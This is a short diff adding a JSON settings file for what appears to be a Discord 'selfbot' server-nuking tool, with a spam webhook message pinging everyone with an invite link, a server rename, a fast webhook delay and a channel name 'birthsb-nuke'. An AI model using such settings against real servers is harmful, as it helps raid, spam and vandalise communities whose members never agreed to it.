@@ -1,0 +1,6 @@
+{
+    "webhook_message": "@everyone JOIN discord.gg/roster",
+    "server_name": "Birth Selfbot /roster",
+    "webhook_delay": 0.3,
+    "channel_name": "birthsb-nuke"
+}
